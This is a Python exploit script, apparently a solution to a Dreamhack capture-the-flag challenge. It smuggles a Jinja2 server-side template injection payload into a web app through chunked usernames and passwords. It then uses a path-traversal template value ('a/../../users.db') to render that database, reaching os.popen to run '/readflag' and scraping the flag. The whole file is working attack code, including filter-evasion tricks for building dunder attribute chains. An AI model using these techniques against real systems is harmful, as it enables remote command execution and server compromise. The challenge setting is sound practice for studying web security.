import requests
import re

url = "http://host3.dreamhack.games:21995"
s = requests.Session()

USERNAMES = {}

def write(chunk, split=False):
    mid = len(chunk) // 2 if split or len(chunk) > 10 else len(chunk)

    user = chunk[:mid]
    USERNAMES[user] = USERNAMES.get(user, -1) + 1

    s.post(f'{url}/register', data={
        'username': f'{USERNAMES[user]}{user}' if USERNAMES[user] > 0 else user,
        'password': chunk[mid:],
    })

    print("> Wrote:", chunk)

def split_str(string, var_name):
    mid = len(string) // 2 + 2

    b1 = f"{{%set {var_name}='{string[:mid]}'%}}"
    b2 = f"{{%set {var_name}={var_name}+'{string[mid:]}'%}}"

    return b1, b2

# chunk the payload
chunks = [
    *split_str('/readflag', 'r'),
    *split_str('__init__', 'n'),
    *split_str('__import__', 'i'),
    *split_str("__globals__", 'g'),
    *split_str("__builtins__", 'b')
]

payload = [
    'self',
    '|attr(n)',
    '|attr(g)',
    '[b]',
    "[i]",
    "('os')",
    ".popen",
    "(r)",
    '.read()'
]

for i in range(len(payload)):
    chunks.append(f'{{%set x={'' if i == 0 else 'x'}{payload[i]}%}}')

chunks.append("{{x}}")

# write payload chunks
write("#}{#", True)

for chunk in chunks[::-1]:
    write(chunk)

# ssti with users.db
creds = {
    'username': 'hacked',
    'password': 'hacked'
}

s.post(f'{url}/register', data=creds)
s.post(f'{url}/login', data=creds)
print("> Logged in")

s.post(f'{url}/memo/new', data={
    'title': 'a',
    'content': 'a',
    'template': 'a/../../users.db'
})

# get ssti leak
res = s.get(f'{url}/memos')

memo_path = re.findall(r'(/memo/[0-9]+)', res.text)[-1]
print("Memo:", memo_path)

res = s.get(f'{url}/{memo_path}')

flag = re.findall(r'(DH{.+})', res.text)[0]
print("Flag:",  flag)